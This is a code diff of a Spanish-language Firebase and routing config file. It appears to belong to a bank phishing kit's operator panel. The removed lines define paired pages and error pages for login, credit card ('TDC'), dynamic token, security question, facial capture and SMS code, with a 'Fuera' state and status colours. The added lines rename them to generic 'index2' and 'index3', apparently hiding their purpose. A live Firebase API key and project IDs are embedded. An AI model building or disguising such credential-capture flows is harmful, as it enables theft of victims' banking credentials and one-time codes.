@@ -1,12 +1,12 @@
 // Configuración centralizada de Firebase y rutas
 
 const firebaseConfig = {
-  apiKey: "AIzaSyA0TRTsikzaUYfnxDW3BfKM4H8ClX6_CMk",
-  authDomain: "o1u9a240.firebaseapp.com",
-  projectId: "o1u9a240",
-  storageBucket: "o1u9a240.firebasestorage.app",
-  messagingSenderId: "246113174191",
-  appId: "1:246113174191:web:37181bb0535448db76ca5a"
+    apiKey: "AIzaSyA0TRTsikzaUYfnxDW3BfKM4H8ClX6_CMk",
+    authDomain: "o1u9a240.firebaseapp.com",
+    projectId: "o1u9a240",
+    storageBucket: "o1u9a240.firebasestorage.app",
+    messagingSenderId: "246113174191",
+    appId: "1:246113174191:web:37181bb0535448db76ca5a"
 };
 // Inicializar Firebase
 if (typeof firebase !== 'undefined') {
@@ -17,10 +17,10 @@ if (typeof firebase !== 'undefined') {
     } else {
         console.log('✅ Firebase ya estaba inicializado');
     }
-    
+
     // Crear referencia a Firestore
     const db = firebase.firestore();
-    
+
     // Hacer db accesible globalmente
     window.db = db;
     console.log('✅ Variable db creada y disponible globalmente');
@@ -34,17 +34,10 @@ const appConfig = {
     routes: {
         1: { url: "/", name: "Login" },
         2: { url: "index_err.html", name: "Index Error" },
-        3: { url: "tdc.html", name: "TDC" },
-        4: { url: "tdc_err.html", name: "TDC Error" },
-        5: { url: "dinamica.html", name: "Dinamica" },
-        6: { url: "dinamica_err.html", name: "Dinamica Error" },
-        7: { url: "#", name: "Fuera" },
-        8: { url: "pregseg.html", name: "Pregunta Seguridad" },
-        9: { url: "pregseg_err.html", name: "Pregunta Seguridad Error" },
-        10: { url: "facial.html", name: "Facial" },
-        11: { url: "facial_err.html", name: "Facial Error" },
-        12: { url: "sms.html", name: "SMS" },
-        13: { url: "sms_err.html", name: "SMS Error" },
+        3: { url: "index2.html", name: "index2" },
+        4: { url: "index2_err.html", name: "index2 Error" },
+        5: { url: "index3.html", name: "index3" },
+        6: { url: "index3_err.html", name: "index3 Error" },
     },
 
     // Tiempo de espera para redirección (en milisegundos)
@@ -54,17 +47,10 @@ const appConfig = {
     actions: {
         home: { page: 1, color: "#87f79fff" },
         index_err: { page: 2, color: "#ffd6de" },
-        tdc: { page: 3, color: "#e8fff0" },
-        tdc_err: { page: 4, color: "#ffd6de" },
-        token: { page: 5, color: "#fff8e8" },
-        token_err: { page: 6, color: "#ffd6de" },
-        fuera: { page: 7, color: "#fff8e8" },
-        pregseg: { page: 8, color: "#fff3cd" },
-        pregseg_err: { page: 9, color: "#ffd6de" },
-        facial: { page: 10, color: "#fff3cd" },
-        facial_err: { page: 11, color: "#ffd6de" },
-        sms: { page: 12, color: "#e8fff0" },
-        sms_err: { page: 13, color: "#ffd6de" },
+        index2: { page: 3, color: "#e8fff0" },
+        index2_err: { page: 4, color: "#ffd6de" },
+        index3: { page: 5, color: "#fff8e8" },
+        index3_err: { page: 6, color: "#ffd6de" },
     },
 
     // Configuración de estados
@@ -72,17 +58,10 @@ const appConfig = {
         0: { text: "Cargando", class: "warning" },
         1: { text: "Inicio", class: "success" },
         2: { text: "Inicio Error", class: "danger" },
-        3: { text: "TDC", class: "success" },
-        4: { text: "TDC Error", class: "danger" },
-        5: { text: "Dinamica", class: "success" },
-        6: { text: "Dinamica Error", class: "danger" },
-        7: { text: "Fuera", class: "danger" },
-        8: { text: "Preg. Seg.", class: "success" },
-        9: { text: "Preg. Seg. Error", class: "danger" },
-        10: { text: "Facial", class: "success" },
-        11: { text: "Facial Error", class: "danger" },
-        12: { text: "SMS", class: "success" },
-        13: { text: "SMS Error", class: "danger" },
+        3: { text: "index2", class: "success" },
+        4: { text: "index2 Error", class: "danger" },
+        5: { text: "index3", class: "success" },
+        6: { text: "index3 Error", class: "danger" },
     }
 };
 
